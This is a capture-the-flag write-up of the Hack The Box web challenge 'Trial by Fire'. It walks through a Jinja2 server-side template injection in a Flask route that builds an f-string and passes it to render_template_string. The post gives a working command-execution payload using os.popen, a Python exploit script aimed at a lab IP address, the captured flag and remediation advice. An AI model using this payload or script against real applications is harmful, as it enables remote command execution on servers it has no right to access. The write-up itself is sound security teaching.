---
title: "Trial by Fire"
date: 2025-03-29
description: "Behind the fiery illusion, a classic SSTI lays hidden. Here's how one template string doomed the Flame Peaks."
tags: ["Web", "CTF", "HTB"]
---

![Trial By Fire](https://github.com/Hacqueen-fr/hacqueen-fr.github.io/raw/refs/heads/main/assets/trialbyfire.png)

> *"The dragon never needed to breathe fire — it just needed an unescaped template string."*

---

## 🧩 Challenge Name

**Trial by Fire** — Jinja2 SSTI

---

## 📖 Storytime

You're thrown into a NES-style fantasy web world.  
Everything seems static — until you spot a user input field labeled `warrior_name`.

You enter `{{7*7}}`.

The game responds with:  
**“49”**.

The fire illusion cracks. SSTI confirmed.

---

## 🔍 Initial Observations

The application exposes a `/begin` endpoint where you submit your `warrior_name`, and a `/battle-report` page renders your performance and inputs.

---

## 🧠 Vulnerability Analysis (Source Code)

In `routes.py`, we find the `/battle-report` route building a dynamic template from **user-supplied data**:

```python
REPORT_TEMPLATE = f"""
...
<p class="nes-text is-primary warrior-name">{warrior_name}</p>
...
<p class="nes-text">{stats['outcome']}</p>
...
"""
return render_template_string(REPORT_TEMPLATE, **stats)
```

### ❌ Problem

- `warrior_name` is injected via **f-string** directly into `REPORT_TEMPLATE`
- Then the whole thing is passed to `render_template_string`, which invokes the **Jinja2 engine**
- This results in **double interpolation**:
    - First by Python (f-string)
    - Then by Jinja2 (via `render_template_string()`)

### 💥 Exploitable chain:

```text
User input → `warrior_name = "{{7*7}}"`  
→ f-string builds a string with `{{7*7}}`  
→ Jinja2 renders it → `49`
```

This allows arbitrary SSTI execution.

---

## 🛠️ Exploit Payload

Once SSTI was confirmed, we used this payload in `warrior_name`:

```jinja
{{url_for.__globals__['os'].popen('cat flag.txt').read()}}
```

---

## 🐍 Exploit Script

```python
import requests
import re

BASE_URL = "http://94.237.63.28:54398"
session = requests.Session()

payload = "{{url_for.__globals__['os'].popen('cat flag.txt').read()}}"
session.post(f"{BASE_URL}/begin", data={"warrior_name": payload})

data = {
    "battle_duration": "10",
    "damage_dealt": "999",
    "damage_taken": "0",
    "spells_cast": "5",
    "turns_survived": "13",
    "outcome": "victory"
}

resp = session.post(f"{BASE_URL}/battle-report", data=data)
html = resp.text

flag_match = re.search(r'HTB\{.*?\}', html)
if flag_match:
    print(f"🏁 FLAG TROUVÉ : {flag_match.group(0)}")
else:
    print("❌ Pas de flag.")
```

---

## 🏁 The Flag

```text
HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_7561b68252ca1d67c68357bea75f7386}
```

---

## ✅ Fix & Remediation

- ❌ **Don’t** use `render_template_string()` with dynamic f-strings and user input
- ✅ **Do** use `render_template("template.html", **context)`
- ✅ Escape user inputs properly or sanitize at input time

---

## 🧵 TL;DR

- SSTI confirmed via `{{7*7}}`
- Core vulnerability: `render_template_string(f"...{user_input}...")`
- Injected `os.popen()` to read `flag.txt`
- Retrieved flag instantly

---

## 🧡 Special Thanks

Shout-out to [**Juliusxd23**](https://github.com/Juliusxd23) who slayed the Fire Drake before me and helped pave the way.  
Sometimes, the true strength is in the alliance.

---

❤️‍🔥 The only fire that matters is the one you light in the template engine.

**– Hacqueen**
